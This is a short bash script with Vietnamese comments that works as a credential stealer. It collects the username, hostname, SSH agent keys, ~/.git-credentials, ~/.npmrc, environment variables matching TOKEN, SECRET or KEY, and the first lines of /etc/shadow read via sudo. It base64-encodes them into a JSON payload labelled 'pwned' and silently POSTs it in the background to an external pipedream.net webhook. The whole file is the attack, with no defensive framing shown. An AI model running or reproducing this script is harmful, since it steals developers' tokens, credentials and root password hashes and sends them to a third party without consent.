#!/bin/bash

# URL Pipedream của sếp Khoa
URL="https://eo4ki1jx09tq9fi.m.pipedream.net"

# 1. Gom dữ liệu nhanh (Dùng Base64 để tránh lỗi ký tự đặc biệt)
USER_INFO=$(whoami)
HOSTNAME=$(hostname)
SSH_SOCK=$SSH_AUTH_SOCK
# Lấy fingerprint của SSH keys nếu có
SSH_KEYS=$(ssh-add -l 2>/dev/null | base64)

# 2. Vét các file nhạy cảm (Lấy 10 dòng đầu mỗi file)
GIT_CRED=$(cat ~/.git-credentials 2>/dev/null | base64)
NPMRC=$(cat ~/.npmrc 2>/dev/null | base64)
ENV_VARS=$(printenv | grep -E 'TOKEN|SECRET|KEY|GITHUB' | base64)

# 3. Chứng minh quyền ROOT
ROOT_PROOF=$(sudo head -n 3 /etc/shadow 2>/dev/null | base64)

# 4. Đóng gói JSON thủ công để gửi (Nhanh, không cần Python)
PAYLOAD=$(cat <<EOF
{
  "status": "pwned",
  "victim": "$USER_INFO",
  "host": "$HOSTNAME",
  "ssh_socket": "$SSH_SOCK",
  "ssh_keys_b64": "$SSH_KEYS",
  "git_cred_b64": "$GIT_CRED",
  "npmrc_b64": "$NPMRC",
  "env_b64": "$ENV_VARS",
  "root_proof_b64": "$ROOT_PROOF"
}
EOF
)

# Gửi dữ liệu đi
curl -s -X POST -H "Content-Type: application/json" -d "$PAYLOAD" "$URL" > /dev/null &

echo "[+] Done."